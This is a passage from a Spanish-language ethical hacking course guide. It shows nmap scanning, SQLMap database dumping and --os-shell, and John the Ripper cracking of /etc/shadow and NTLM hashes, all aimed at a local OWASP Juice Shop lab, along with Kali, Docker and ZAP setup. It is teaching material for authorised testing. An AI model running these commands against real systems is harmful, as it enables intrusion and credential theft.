nmap --script http-enum 192.168.56.102          # Enumerar directorios web
nmap --script smb-vuln-ms17-010 192.168.56.103 # Detectar EternalBlue
nmap --script discovery 192.168.56.102          # Scripts de descubrimiento

# Múltiples scripts
nmap --script "vuln and safe" 192.168.56.102

# ============================================
# GUARDAR RESULTADOS
# ============================================

# Guardar en todos los formatos
nmap -oA scan_resultado 192.168.56.102

# Formatos específicos
nmap -oN scan.nmap 192.168.56.102    # Normal
nmap -oX scan.xml 192.168.56.102    # XML
nmap -oG scan.grepable 192.168.56.102  # Grepable

# ============================================
# TIMING Y OPTIMIZACIÓN
# ============================================

# Timing (0=paranoico, 5=locuelo)
nmap -T4 192.168.56.102

# No hacer ping (escaneo directo)
nmap -Pn 192.168.56.102

# Usar múltiples hilos
nmap --min-parallelism 50 192.168.56.102
```

**Ejemplo práctico con OWASP Juice Shop:**
```bash
# 1. Descubrir hosts en la red
nmap -sn 192.168.56.0/24

# 2. Identificar puertos abiertos en Juice Shop
nmap -sV -p 3000 192.168.56.101

# 3. Escaneo completo de puertos
nmap -p- -sV 192.168.56.101

# 4. Scripts específicos para web
nmap --script http-enum,http-title,http-headers 192.168.56.101 -p 3000

# 5. Detectar vulnerabilidades web conocidas
nmap --script http-vuln* 192.168.56.101 -p 3000
```

---

#### HERRAMIENTA 2: SQLMAP (Fase de Explotación)

**¿Qué es SQLMap?**
SQLMap es una herramienta de código abierto para detección y explotación automatizada de vulnerabilidades de inyección SQL. Soporta 6 tipos de técnicas de inyección SQL.

**¿Por qué es útil en hacking ético?**
La inyección SQL es una de las vulnerabilidades más críticas del OWASP Top 10. SQLMap automatiza el proceso de detección y explotación, permitiendo extraer bases de datos completas de manera estructurada.

**Instalación:**
```bash
# En Kali ya viene instalado
which sqlmap

# Para otras distribuciones:
# Opción 1: Desde repositorio
sudo apt install sqlmap

# Opción 2: Desde GitHub (última versión)
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --version
```

**Comandos fundamentales:**

```bash
# ============================================
# DETECCIÓN BÁSICA
# ============================================

# Deteccion básica de SQL injection
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test"

# Deteccion con cookies (para páginas autenticadas)
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --cookie="PHPSESSID=abc123"

# Deteccion con POST data
sqlmap -u "http://192.168.56.101:3000/login" \
  --data="username=admin&password=admin"

# ============================================
# ENUMERACIÓN DE BASES DE DATOS
# ============================================

# Listar todas las bases de datos
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --dbs

# Base de datos actual
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --current-db

# ============================================
# ENUMERACIÓN DE TABLAS
# ============================================

# Listar tablas de una base de datos
sqlmap -u "..." -D juice_shop --tables

# Listar tablas de TODAS las bases de datos
sqlmap -u "..." --tables

# ============================================
# ENUMERACIÓN DE COLUMNAS
# ============================================

# Listar columnas de una tabla
sqlmap -u "..." -D juice_shop -T users --columns

# ============================================
# EXTRACCIÓN DE DATOS
# ============================================

# Extraer toda una tabla
sqlmap -u "..." -D juice_shop -T users --dump

# Extraer columnas específicas
sqlmap -u "..." -D juice_shop -T users -C email,password --dump

# Extraer todas las bases de datos completas
sqlmap -u "..." --dump-all

# ============================================
# OPCIONES AVANZADAS
# ============================================

# Nivel de riesgo (1-5, default 1)
sqlmap -u "..." --level=5

# Riesgo de pruebas (1-3, default 1)
sqlmap -u "..." --risk=3

# Técnicas específicas
sqlmap -u "..." --technique=B      # Based
sqlmap -u "..." --technique=U      # Union
sqlmap -u "..." --technique=E      # Error
sqlmap -u "..." --technique=S      # Stacked
sqlmap -u "..." --technique=T      # Time-based blind
sqlmap -u "..." --technique=BU     # Combinación

# Verbose (0-6)
sqlmap -u "..." -v 3

# Proxy
sqlmap -u "..." --proxy=http://127.0.0.1:8080

# ============================================
# SHELL INTERACTIVO
# ============================================

# Obtener shell del sistema operativo
sqlmap -u "..." --os-shell

# SQL shell para consultas directas
sqlmap -u "..." --sql-shell

# ============================================
# AUTOMATIZACIÓN COMPLETA
# ============================================

# Modo batch (sin interacción)
sqlmap -u "..." --batch --dbs

# Con archivo de configuración
sqlmap -c sqlmap.conf -u "..."

# Output personalizado
sqlmap -u "..." -o --output-dir=/root/sqlmap_results/
```

**Ejemplo práctico con OWASP Juice Shop:**
```bash
# 1. Detectar si el parámetro q es vulnerable
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch

# 2. Ver bases de datos
sqlmap -u "..." --dbs

# 3. Ver tablas de juice_shop
sqlmap -u "..." -D juice_shop --tables

# 4. Ver columnas de users
sqlmap -u "..." -D juice_shop -T users --columns

# 5. Extraer usuarios
sqlmap -u "..." -D juice_shop -T users --dump

# 6. Extraer TODO
sqlmap -u "..." --dump-all --batch
```

---

#### HERRAMIENTA 3: JOHN THE RIPPER (Fase de Post-Explotación)

**¿Qué es John the Ripper?**
John the Ripper (John) es la herramienta de crackeo de contraseñas más famosa. Fue creada en 1996 por Solar Designer y soporta cientos de formatos de hash.

**¿Por qué es útil en hacking ético?**
Después de extraer hashes de contraseñas de una base de datos comprometida, necesitas crackearlos para obtener las contraseñas en texto plano. Esto demuestra el impacto real de la vulnerabilidad y verifica si los usuarios usan contraseñas fuertes.

**Instalación:**
```bash
# En Kali ya viene instalado
which john

# Versión mejorada (Jumbo) en Kali
which john --show-format

# Para otras distribuciones:
sudo apt install john

# Compilar desde fuente (última versión):
git clone https://github.com/openwall/john.git
cd john/src
./configure && make
```

**Conceptos Importantes:**

```
┌─────────────────────────────────────────────────────────────────┐
│              MÉTODOS DE CRACKEO DE CONTRASEÑAS                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. DICCIONARIO (Wordlist)                                      │
│  ├── Prueba contraseñas de una lista                           │
│  ├── Rápido y eficiente                                        │
│  └── rockyou.txt tiene ~14 millones de contraseñas             │
│                                                                 │
│  2. FUERZA BRUTA                                              │
│  ├── Prueba TODAS las combinaciones                            │
│  ├── Muy lento (caracteres, longitud)                         │
│  └── Útil para contraseñas cortas                               │
│                                                                 │
│  3. REGLAS (Rules)                                             │
│  ├── Aplica transformaciones a wordlists                       │
│  ├── Ej: password123 → PASSWORD123, p@ssword                   │
│  └── Gran aumento de cobertura                                  │
│                                                                 │
│  4. HÍBRIDO                                                    │
│  ├── Combinación de diccionario + fuerza bruta                 │
│  └── Ej: diccionario + números al final                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Comandos fundamentales:**

```bash
# ============================================
# PREPARAR ARCHIVO DE HASHES
# ============================================

# Formato típico de archivo de hashes:
# usuario:hash
# admin:5f4dcc3b5aa765d61d8327deb882cf99

# Crear archivo de prueba
cat > hashes.txt << 'EOF'
admin:5f4dcc3b5aa765d61d8327deb882cf99
user:5d41402abc4b2a76b9719d911017c592
EOF

# ============================================
# CRACKEO BÁSICO
# ============================================

# Detectar automáticamente el formato
john hashes.txt

# Con diccionario específico
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver progreso mientras corre
john --progress=1000 hashes.txt

# ============================================
# VER RESULTADOS
# ============================================

# Mostrar contraseñas crackeadas
john --show hashes.txt

# Mostrar solo contraseñas (sin hashes)
john --show --format=raw-md5 hashes.txt | grep -v "0 password"

# Mostrar bases de datos crackeadas
john --show --all hashes.txt

# ============================================
# FORMATOS DE HASH
# ============================================

# Especificar formato manualmente
john --format=raw-md5 hashes.txt
john --format=raw-md5-opencl hashes.txt  # GPU
john --format=bcrypt hashes.txt
john --format=sha512crypt hashes.txt
john --format=sha256crypt hashes.txt
john --format=nt2 hashes.txt             # NTLM
john --format=LM hashes.txt             # Windows LAN Manager

# Listar formatos disponibles
john --list=formats | head -30

# Identificar formato automáticamente
john --identify hashes.txt

# ============================================
# OPCIONES AVANZADAS
# ============================================

# Usar reglas
john --wordlist=rockyou.txt --rules hashes.txt

# Fuerza bruta con máscaras
john --mask=?l?l?l?l?d?d?d?d hashes.txt
# ?l = minúscula, ?u = mayúscula, ?d = dígito, ?s = símbolo

# Longitud específica
john --mask=password?d?d hashes.txt

# Combinar con diccionario
john --wordlist=words.txt --rules --external=double hashes.txt

# Shell interactivo
john --shell hashes.txt

# ============================================
# RENDIMIENTO
# ============================================

# Ver información de benchmark
john --test

# Ver opciones de OpenCL/GPU
john --list=opencl-devices
john --device=1 hashes.txt  # Usar GPU específica

# ============================================
# CRACKEAR /etc/shadow EN LINUX
# ============================================

# Combinar passwd y shadow
unshadow /etc/passwd /etc/shadow > ~/unshadowed.txt

# Crackear
john --rules ~/unshadowed.txt

# ============================================
# CRACKEAR HASHES WINDOWS
# ============================================

# Extraer hashes con mimikatz (en Windows)
# o usar pwdump/secretsdump

# Crear archivo en formato pwdump:
# administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Crackear NTLM
john --format=NT hashes_windows.txt

# Crackear LM + NTLM
john --format=LM hashes_lm.txt
```

**Ejemplo práctico:**
```bash
# 1. Supongamos que extrajiste hashes de Juice Shop
cat > juice_hashes.txt << 'EOF'
admin@juice-sh.op:$2a$10$X5B8Z7K3M9N2P5Q7R1S4T
user@juice-sh.op:$2a$10$J7K4L5M6N8P2Q3R5S7T9U
EOF

# 2. Identificar el tipo de hash
john --identify juice_hashes.txt

# 3. Crackear con diccionario
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt juice_hashes.txt

# 4. Ver resultados
john --show juice_hashes.txt
```

---

## 6. INSTALACIÓN DE KALI LINUX

### 6.1. Opciones de Instalación

```
┌─────────────────────────────────────────────────────────────────┐
│              OPCIONES PARA OBTENER KALI LINUX                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. IMAGEN PRE-CONSTRUIDA (RECOMENDADA)                        │
│  ├── Descargar: https://www.kali.org/get-kali/                 │
│  ├── VMware Image (zip)                                        │
│  ├── VirtualBox Image (zip)                                    │
│  └── Hyper-V Image (zip)                                       │
│  └── Ventaja: Ya configurada, solo importar                    │
│                                                                 │
│  2. ISO OFICIAL (Instalación manual)                           │
│  ├── Descargar imagen ISO                                      │
│  ├── Crear USB booteable con Rufus                             │
│  └── Instalar como sistema operativo normal                     │
│                                                                 │
│  3. DOCKER (Contenedor)                                        │
│  ├── docker pull kalilinux/kali-rolling                       │
│  └── Ventaja: Ligero, rápido                                   │
│                                                                 │
│  4. AWS / CLOUD                                               │
│  ├── Amazon Machine Image (AMI)                                │
│  └── Ventaja: Acceso desde cualquier lugar                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2. Instalación Rápida (Imagen Pre-construida VirtualBox)

```
┌─────────────────────────────────────────────────────────────────┐
│     INSTALACIÓN RÁPIDA: IMAGEN PRE-CONSTRUIDA VIRTUALBOX        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PASO 1: Descargar imagen                                      │
│  ├── Ir a: https://www.kali.org/get-kali/                     │
│  ├── Seleccionar "Kali Linux VirtualBox Images"               │
│  └── Descargar archivo .7z (~4GB)                              │
│                                                                 │
│  PASO 2: Extraer archivo                                       │
│  ├── Instalar 7-Zip si no tienes                              │
│  ├── Extraer el archivo .7z                                    │
│  └── Deberías obtener un archivo .vdi                          │
│                                                                 │
│  PASO 3: Crear VM en VirtualBox                               │
│  ├── VirtualBox > Nueva                                        │
│  ├── Nombre: Kali-Linux                                       │
│  ├── Tipo: Linux                                               │
│  ├── Versión: Debian (64-bit)                                  │
│  └── Click "Siguiente"                                        │
│                                                                 │
│  PASO 4: Configurar recursos                                   │
│  ├── Memoria RAM: 4096 MB (mínimo 2048)                        │
│  ├── CPU: 2 cores (mínimo 1)                                  │
│  └── Click "Siguiente"                                        │
│                                                                 │
│  PASO 5: Usar disco existente                                 │
│  ├── Seleccionar "Usar un archivo de disco duro existente"    │
│  ├── Clic en el icono de carpeta                              │
│  ├── Buscar el archivo .vdi extraído                          │
│  └── Click "Crear"                                            │
│                                                                 │
│  PASO 6: Iniciar Kali                                          │
│  ├── Seleccionar la VM > Iniciar                              │
│  ├── Credenciales por defecto:                                 │
│  │   Usuario: root                                            │
│  │   Contraseña: toor                                         │
│  └── Cambiar contraseña al iniciar                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.3. Instalación desde ISO (Guía Completa)

```bash
# PASO 1: Descargar imagen ISO
# Ir a https://www.kali.org/download-kali-linux-command-line/
# Descargar archivo ~4GB

# PASO 2: Crear USB booteable (en Linux)
# Identificar USB (CUIDADO: /dev/sdX es el disco, no la partición)
sudo fdisk -l

# Escribir imagen a USB (MUY IMPORTANTE: usar el dispositivo correcto)
sudo dd if=kali-linux-2024.X-installer-amd64.iso of=/dev/sdX bs=4M status=progress

# Sincronizar
sync

# En Windows: Usar Rufus o Etcher
# https://rufus.ie/
# https://etcher.balena.io/

# PASO 3: Arrancar desde USB
# Reiniciar y entrar a BIOS/UEFI
# Cambiar orden de arranque para USB primero
# Guardar y reiniciar

# PASO 4: Proceso de instalación
# 1. Seleccionar "Graphical Install"
# 2. Idioma: Spanish
# 3. Ubicación: Tu país
# 4. Configurar teclado: Spanish ( Latinoamericano u Español)
# 5. Nombre de máquina: kali
# 6. Nombre de dominio: (dejar vacío)
# 7. Contraseña root: Establecer contraseña fuerte
# 8. Particionado: "Guiado - usar disco entero"
# 9. Particiones: "Todos los archivos en una partición"
# 10. Confirmar particionado
# 11. Esperar instalación (~10-20 minutos)
# 12. Configurar red: Sí
# 13. Proxy: (dejar vacío)
# 14. Instalar GRUB: Sí
# 15. Device for boot loader: /dev/sda
# 16. Finalizar instalación
```

### 6.4. Post-Instalación de Kali

```bash
# ============================================
# CONFIGURACIÓN INICIAL
# ============================================

# Cambiar contraseña de root
passwd

# Crear usuario normal (recomendado)
adduser nombre_usuario
# Agregar a grupos sudo
usermod -aG sudo nombre_usuario

# Actualizar sistema
apt update && apt upgrade -y

# Instalar Guest Additions (si es VM)
# Dispositivos > Insertar imagen de Guest Additions
apt install -y build-essential dkms linux-headers-$(uname -r)
mkdir /mnt/cdrom
mount /dev/cdrom /mnt/cdrom
cd /mnt/cdrom
./VBoxLinuxAdditions.run
reboot

# ============================================
# INSTALAR HERRAMIENTAS ÚTILES
# ============================================

# Metapackages comunes
apt install -y kali-linux-large  # Todas las herramientas
# o
apt install -y kali-linux-web     # Solo herramientas web
# o
apt install -y kali-linux-pwtools  # Solo herramientas de contraseñas

# Herramientas específicas útiles
apt install -y Terminator         # Terminal con panes
apt install -y vim               # Editor de texto
apt install -y git               # Control de versiones

# ============================================
# CONFIGURAR RED
# ============================================

# Ver interfaces
ip a

# Configurar IP estática (si es necesario)
nano /etc/network/interfaces

# Agregar:
# auto eth0
# iface eth0 inet static
# address 192.168.56.101
# netmask 255.255.255.0
# gateway 192.168.56.1

# Reiniciar red
systemctl restart networking

# ============================================
# SNAPSHOTS (si usas VirtualBox)
# ============================================

# Crear snapshot del estado inicial
VBoxManage snapshot "Kali-Linux" take "Estado-Inicial" --description "Kali Linux recién instalado"

# Restaurar snapshot si algo sale mal
VBoxManage snapshot "Kali-Linux" restore "Estado-Inicial"
```

---

## 7. INSTALACIÓN DE OWASP JUICE SHOP EN KALI LINUX

### 7.1. Método 1: Docker (Recomendado)

```bash
# ============================================
# INSTALAR DOCKER
# ============================================

# Instalar dependencias
sudo apt update
sudo apt install -y apt-transport-https ca-certificates curl gnupg lsb-release

# Añadir clave GPG de Docker
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg

# Añadir repositorio
echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Instalar Docker
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin

# Añadir usuario al grupo docker
sudo usermod -aG docker $USER

# Cerrar sesión y volver a entrar
# O ejecutar:
newgrp docker

# Verificar instalación
docker --version
sudo systemctl status docker

# ============================================
# EJECUTAR JUICE SHOP EN DOCKER
# ============================================

# Descargar imagen oficial
docker pull bkimminich/juice-shop

# Ejecutar contenedor
docker run -d \
  --name juice-shop \
  -p 3000:3000 \
  bkimminich/juice-shop

# Verificar que está corriendo
docker ps

# Ver logs
docker logs juice-shop

# Acceder desde navegador
# http://localhost:3000

# Si quieres acceder desde otras VMs:
# http://192.168.56.101:3000

# ============================================
# COMANDOS ÚTILES DE DOCKER PARA JUICE SHOP
# ============================================

# Detener contenedor
docker stop juice-shop

# Iniciar contenedor
docker start juice-shop

# Reiniciar contenedor
docker restart juice-shop

# Eliminar contenedor
docker stop juice-shop && docker rm juice-shop

# Ver uso de recursos
docker stats juice-shop

# Ejecutar comandos dentro del contenedor
docker exec -it juice-shop /bin/sh

# Dentro del contenedor, acceder a archivos
ls -la /juice-shop/

# Personalizar configuración
docker stop juice-shop
docker rm juice-shop

docker run -d \
  --name juice-shop \
  -p 3000:3000 \
  -e "NODE_ENV=production" \
  -v $(pwd)/config.yml:/juice-shop/config.yml \
  bkimminich/juice-shop
```

### 7.2. Método 2: Instalación Directa con Node.js

```bash
# ============================================
# INSTALAR NODE.JS Y NPM
# ============================================

# Instalar Node.js 18.x (LTS)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Verificar instalación
node --version
npm --version

# ============================================
# INSTALAR JUICE SHOP
# ============================================

# Opción A: Clonar repositorio
cd /opt
sudo git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop

# Opción B: Descargar release
# wget https://github.com/juice-shop/juice-shop/releases/download/v13.3.1/juice-shop-13.3.1.tgz
# tar -xzf juice-shop-13.3.1.tgz

# Instalar dependencias
npm install

# Iniciar servidor
npm start

# Juice Shop estará disponible en http://localhost:3000

# ============================================
# CREAR SERVICIO SYSTEMD (INICIO AUTOMÁTICO)
# ============================================

# Crear archivo de servicio
sudo nano /etc/systemd/system/juice-shop.service

# Contenido:
'''
[Unit]
Description=OWASP Juice Shop
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/juice-shop
ExecStart=/usr/bin/npm start
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
'''

# Recargar systemd
sudo systemctl daemon-reload

# Habilitar servicio
sudo systemctl enable juice-shop

# Iniciar servicio
sudo systemctl start juice-shop

# Verificar estado
sudo systemctl status juice-shop

# ============================================
# ACCEDER A JUICE SHOP
# ============================================

# Desde el navegador en Kali:
# http://localhost:3000

# Desde otra máquina en la red:
# http://192.168.56.101:3000

# Ver logs en tiempo real
journalctl -u juice-shop -f
```

### 7.3. Método 3: Docker Compose (Desarrollo)

```bash
# ============================================
# CREAR ARCHIVO DOCKER-COMPOSE.YML
# ============================================

mkdir ~/juice-shop && cd ~/juice-shop

cat > docker-compose.yml << 'EOF'
version: '3.8'

services:
  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
    volumes:
      - ./data:/juice-shop/data
      - ./config.yml:/juice-shop/config.yml:ro
    environment:
      - NODE_ENV=production
    restart: unless-stopped
    networks:
      - juice-net

  juice-shop-db:
    image: postgres:15-alpine
    environment:
      - POSTGRES_DB=juice_shop
      - POSTGRES_USER=juice
      - POSTGRES_PASSWORD=juice_password
    volumes:
      - pgdata:/var/lib/postgresql/data
    restart: unless-stopped
    networks:
      - juice-net

volumes:
  pgdata:

networks:
  juice-net:
    driver: bridge
EOF

# ============================================
# INICIAR CON DOCKER COMPOSE
# ============================================

# Iniciar servicios
docker-compose up -d

# Ver servicios
docker-compose ps

# Ver logs
docker-compose logs -f

# Detener servicios
docker-compose down

# Detener y eliminar volúmenes
docker-compose down -v
```

---

## 8. COMANDOS DE LINUX Y DOCKER PARA PENTESTING

### 8.1. Comandos Esenciales de Linux

```
┌─────────────────────────────────────────────────────────────────┐
│              COMANDOS LINUX PARA PENTESTING                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  NAVEGACIÓN Y ARCHIVOS                                          │
│  ──────────────────────────                                      │
│  pwd                    → Directorio actual                    │
│  ls -la                  → Listar archivos (incluidos ocultos)  │
│  cd /ruta                → Cambiar directorio                   │
│  cd ..                   → Ir al directorio padre               │
│  cd ~                    → Ir al directorio home                │
│  mkdir nombre            → Crear directorio                      │
│  touch archivo           → Crear archivo vacío                   │
│  cp origen destino       → Copiar archivo                        │
│  mv origen destino       → Mover/Renombrar                       │
│  rm archivo              → Eliminar archivo                      │
│  rm -rf directorio       → Eliminar directorio recursivamente   │
│                                                                 │
│  BÚSQUEDA Y CONTENIDO                                           │
│  ──────────────────────────                                      │
│  grep "patrón" archivo → Buscar texto en archivo                │
│  grep -r "patrón" dir  → Buscar recursivamente                  │
│  find / -name archivo   → Buscar archivo por nombre             │
│  find / -perm -4000     → Buscar archivos SUID                  │
│  cat archivo             → Mostrar contenido completo            │
│  head -n 20 archivo      → Mostrar primeras 20 líneas            │
│  tail -n 20 archivo      → Mostrar últimas 20 líneas            │
│  wc -l archivo           → Contar líneas                          │
│                                                                 │
│  REDES                                                            │
│  ─────                                                            │
│  ip a                  → Ver interfaces de red                 │
│  ip route               → Ver tabla de enrutamiento             │
│  ping host              → Probar conectividad                    │
│  curl url               → Hacer petición HTTP                    │
│  wget url               → Descargar archivo                      │
│  nc -lvnp 4444          → Netcat en modo escucha                │
│  telnet host puerto     → Conexión Telnet                       │
│  ssh usuario@host       → Conexión SSH                          │
│  ss -tulpn             → Ver puertos listening                  │
│  netstat -tulpn         → Ver conexiones                        │
│  ifconfig               → Configuración de red (legacy)         │
│                                                                 │
│  PROCESOS Y SISTEMA                                              │
│  ───────────────────                                              │
│  ps aux                 → Ver todos los procesos                 │
│  top                    → Monitor de procesos                    │
│  htop                   → Monitor interactivo                    │
│  kill PID               → Matar proceso por PID                  │
│  killall nombre         → Matar proceso por nombre               │
│  df -h                  → Uso de disco                          │
│  du -sh directorio      → Tamaño de directorio                  │
│  free -h                → Uso de memoria                        │
│  uname -a               → Información del sistema              │
│  whoami                 → Usuario actual                        │
│  sudo comando           → Ejecutar como root                     │
│  history                → Historial de comandos                  │
│                                                                 │
│  PERMISOS                                                          │
│  ────────                                                           │
│  chmod 755 archivo        → Cambiar permisos (rwxr-xr-x)         │
│  chmod +x archivo        → Agregar permiso de ejecución          │
│  chown user:group archivo → Cambiar propietario                  │
│  ls -la archivo          → Ver permisos actuales                │
│                                                                 │
│  COMPRESIÓN Y DESCARGA                                           │
│  ─────────────────────────                                       │
│  tar -cvzf archivo.tar.gz directorio → Comprimir                 │
│  tar -xvzf archivo.tar.gz → Descomprimir                        │
│  unzip archivo.zip       → Descomprimir ZIP                      │
│  wget -O archivo url     → Descargar archivo                    │
│  curl -O url            → Descargar archivo                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2. Comandos de Docker

```
┌─────────────────────────────────────────────────────────────────┐
│              COMANDOS DOCKER PARA PENTESTING                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  IMÁGENES                                                        │
│  ─────────                                                       │
│  docker images               → Listar imágenes locales           │
│  docker pull imagen:tag      → Descargar imagen                  │
│  docker rmi imagen           → Eliminar imagen                   │
│  docker build -t nombre .    → Construir imagen desde Dockerfile │
│  docker tag imagen nueva:tag → Renombrar etiqueta               │
│  docker save -o archivo.tar imagen → Exportar imagen             │
│  docker load -i archivo.tar → Importar imagen                   │
│                                                                 │
│  CONTENEDORES                                                    │
│  ────────────                                                    │
│  docker ps                  → Listar contenedores en ejecución   │
│  docker ps -a               → Listar TODOS los contenedores    │
│  docker run imagen          → Crear y ejecutar contenedor       │
│  docker start contenedor    → Iniciar contenedor detenido       │
│  docker stop contenedor     → Detener contenedor                │
│  docker restart contenedor  → Reiniciar contenedor              │
│  docker rm contenedor       → Eliminar contenedor               │
│  docker rm $(docker ps -aq) → Eliminar todos los contenedores  │
│                                                                 │
│  OPCIONES COMUNES DE docker run                                 │
│  ─────────────────────────────                                  │
│  -d                        → Ejecutar en background (daemon)    │
│  -it                       → Modo interactivo con terminal      │
│  -p HOST:CONTENEDOR        → Mapear puertos                    │
│  -v HOST:CONTENEDOR        → Montar volúmenes                  │
│  --name nombre              → Asignar nombre al contenedor      │
│  --rm                      → Eliminar al detener                │
│  -e VAR=valor              → Variables de entorno               │
│  --network red            → Unirse a una red Docker             │
│                                                                 │
│  EJEMPLOS PRÁCTICOS                                             │
│  ──────────────────                                             │
│  # Ejecutar contenedor interactivo                               │
│  docker run -it ubuntu:22.04 /bin/bash                          │
│                                                                 │
│  # Ejecutar en background con puertos                            │
│  docker run -d --name web -p 8080:80 nginx                      │
│                                                                 │
│  # Ejecutar con volumen                                         │
│  docker run -v /home/user/data:/data container                  │
│                                                                 │
│  # Detener y eliminar todos                                      │
│  docker stop $(docker ps -aq) && docker rm $(docker ps -aq)    │
│                                                                 │
│  INTERACCIÓN CON CONTENEDORES                                    │
│  ────────────────────────────                                   │
│  docker exec -it contenedor /bin/bash → Entrar al contenedor    │
│  docker exec contenedor comando         → Ejecutar comando       │
│  docker logs contenedor                 → Ver logs              │
│  docker logs -f contenedor              → Logs en tiempo real   │
│  docker cp archivo contenedor:/ruta      → Copiar a contenedor  │
│  docker cp contenedor:/ruta archivo     → Copiar desde cont.   │
│  docker inspect contenedor              → Ver detalles JSON     │
│  docker diff contenedor                 → Ver cambios          │
│                                                                 │
│  VOLÚMENES                                                       │
│  ─────────                                                       │
│  docker volume ls                → Listar volúmenes            │
│  docker volume create nombre     → Crear volumen                │
│  docker volume inspect nombre   → Ver detalles                 │
│  docker volume rm nombre         → Eliminar volumen            │
│  docker volume prune            → Eliminar volúmenes sin uso    │
│                                                                 │
│  REDES                                                           │
│  ──────                                                          │
│  docker network ls                → Listar redes                │
│  docker network create nombre    → Crear red                    │
│  docker network inspect nombre   → Ver detalles de red         │
│  docker network connect red contenedor → Conectar contenedor   │
│  docker network disconnect red contenedor → Desconectar         │
│  docker network rm nombre         → Eliminar red               │
│                                                                 │
│  LIMPIEZA                                                        │
│  ───────                                                         │
│  docker system df               → Ver uso de recursos          │
│  docker system prune            → Limpiar recursos sin uso     │
│  docker image prune -a          → Eliminar imágenes sin usar   │
│  docker container prune         → Eliminar contenedores det.   │
│  docker volume prune            → Eliminar volúmenes sin uso   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.3. Comandos Combinados para Laboratorio

```bash
# ============================================
# COMANDOS PRÁCTICOS PARA EL LABORATORIO
# ============================================

# Iniciar Juice Shop y verificar
docker run -d --name juice -p 3000:3000 bkimminich/juice-shop
sleep 5 && curl -s http://localhost:3000 | head -c 200

# Ver todos los contenedores relacionados
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"

# Ver puertos mapeados
docker port juice

# Ver uso de recursos
docker stats --no-stream

# Entrar al contenedor
docker exec -it juice sh

# Ver logs de la aplicación
docker logs juice 2>&1 | tail -50

# Reiniciar si hay problemas
docker restart juice && docker logs -f juice

# Ver red Docker
docker network ls
docker network inspect bridge | jq '.[0].IPAM.Config'

# Backup de datos de Juice Shop
docker exec juice tar -czf - /juice-shop > backup_juice.tar.gz

# Restaurar backup
docker exec -i juice tar -xzf - -C / < backup_juice.tar.gz
```

---

## 9. OWASP ZAP Y BURP SUITE: ANÁLISIS PROFUNDO DE TRÁFICO WEB

### 9.1. ¿Por Qué Usar ZAP y Burp Suite en Lugar del Inspector de Navegador?

```
┌─────────────────────────────────────────────────────────────────┐
│      LIMITACIONES DE LOS INSPECTORES DE NAVEGADOR               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Los navegadores como Chrome y Firefox son herramientas         │
│  diseñadas para usuarios normales, NO para seguridad.           │
│                                                                 │
│  LIMITACIONES DEL INSPECTOR DE DESARROLLADOR:                   │
│  ───────────────────────────────────────────────                │
│  ✗ No permite modificar y reenviar peticiones fácilmente       │
│  ✗ No tiene funciones de fuzzing integradas                    │
│  ✗ No detecta vulnerabilidades automáticamente                 │
│  ✗ No permite manipular cookies de manera avanzada             │
│  ✗ No tiene herramientas de decodificación profesional        │
│  ✗ No permite ataques de fuerza bruta automatizados            │
│  ✗ No puede interceptar apps que usan certificate pinning     │
│  ✗ No tiene motores de búsqueda de vulnerabilidades            │
│                                                                 │
│  LO QUE PERMITE ZAP/BURP:                                       │
│  ──────────────────────────                                      │
│  ✓ Interceptar y modificar CUALQUIER petición HTTP/S          │
│  ✓ Reenviar peticiones modificadas múltiples veces             │
│  ✓ Automatizar detección de vulnerabilidades                   │
│  ✓ Fuzzing con payloads personalizados                         │
│  ✓ Manipulación de sesiones y cookies                          │
│  ✓ Decodificación/Recodificación de múltiples formatos        │
│  ✓ Análisis de WebSockets                                     │
│  ✓ Generación de informes profesionales                        │
│  ✓ Integración con herramientas de pentesting                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 9.2. OWASP ZAP (Zed Attack Proxy)

#### ¿Qué es OWASP ZAP?

OWASP ZAP es una herramienta gratuita y de código abierto desarrollada por la OWASP (Open Web Application Security Project). Es uno de los escáneres de vulnerabilidades web más utilizados del mundo.

**Características principales:**
- Proxy interceptador (como Burp)
- Escaneo automatizado de vulnerabilidades
- Fuzzing de parámetros
- Detección pasiva de vulnerabilidades
- Soporte para autenticación
- API REST para automatización

#### Instalación en Kali:

```bash
# En Kali ya viene instalado
which zaproxy
which zap-cli

# Para otras distribuciones:
# Descargar desde: https://www.zaproxy.org/download/
# En Linux:
wget https://github.com/zaproxy/zaproxy/releases/download/v2.12.0/ZAP_2.12.0_Linux.tar.gz
